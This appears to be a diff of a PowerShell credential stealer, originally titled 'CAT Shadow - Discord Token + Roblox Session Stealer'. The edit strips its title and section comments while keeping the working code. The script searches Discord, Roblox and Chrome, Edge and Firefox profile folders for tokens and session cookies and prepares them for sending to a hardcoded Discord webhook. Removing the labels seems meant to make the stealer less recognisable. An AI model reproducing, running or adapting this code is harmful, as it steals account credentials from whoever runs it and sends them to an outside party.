@@ -1,10 +1,4 @@
-# ==============================================
-# CAT Shadow - Discord Token + Roblox Session Stealer
-# Requires: PowerShell 7 (pwsh)
-# ==============================================
 $w='https://discord.com/api/webhooks/1538403770965426247/cKkhSXToyltnfneUV1D1q8kV1Y3KpH_iUXK8rgozjvNOtKQjXWxBj-l9EZDLdmPI-AEL';
-
-# ---------- 디스코드 토큰 ----------
 $t=@();
 $paths=@("$env:APPDATA\discord","$env:APPDATA\discordcanary","$env:APPDATA\discordptb");
 foreach($p in $paths){
@@ -38,9 +32,7 @@ foreach($p in $paths){
             }
         }
     }
-}
-
-# ---------- Roblox 세션 ----------
+};
 $rbx=@();
 $robPaths=@("$env:LOCALAPPDATA\Roblox","$env:APPDATA\Roblox");
 foreach($rp in $robPaths){
@@ -58,7 +50,6 @@ foreach($rp in $robPaths){
         }
     }
 }
-# 브라우저 쿠키에서 검색
 $browserRoots=@("$env:LOCALAPPDATA\Google\Chrome\User Data","$env:LOCALAPPDATA\Microsoft\Edge\User Data","$env:APPDATA\Mozilla\Firefox\Profiles");
 foreach($br in $browserRoots){
     if(Test-Path $br){
@@ -77,8 +68,6 @@ foreach($br in $browserRoots){
         }
     }
 }
-
-# ---------- 웹훅 전송 ----------
 $dt = if($t.Count){$t -join ','}else{'none'};
 $rb = if($rbx.Count){$rbx -join ' | '}else{'none'};
 $msg = "Discord Tokens: $dt`nRoblox Session: $rb";
